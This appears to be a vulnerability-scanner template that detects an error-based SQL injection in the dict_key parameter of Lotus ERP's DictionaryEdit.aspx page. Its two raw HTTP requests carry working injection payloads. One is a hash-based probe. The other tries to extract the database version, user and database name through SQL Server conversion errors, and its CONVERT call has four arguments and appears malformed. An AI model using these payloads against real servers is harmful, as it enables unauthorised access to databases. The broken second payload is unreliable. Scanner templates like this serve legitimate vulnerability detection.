id: sql-injection-lotus-erp-dictionaryedit

info:
  name: SQL Injection on Lotus ERP DictionaryEdit.aspx
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The key parameter in the DictionaryEdit.aspx page of the Lotus ERP system is vulnerable to SQL error injection, allowing attackers to obtain database permissions.
  tags: sql-injection

http:
  - raw:
      - |
        GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32))-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "e10adc3949ba59abbe56e057f20f883e"

  - raw:
      - |
        GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(255),@@version,user,db_name())-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: regex
        regex:
          - "varchar\\s\\S\\s'(.*?)'"
    extractors:
      - type: regex
        group: 1
        regex:
          - "varchar\\s\\S\\s'(.*?)'"
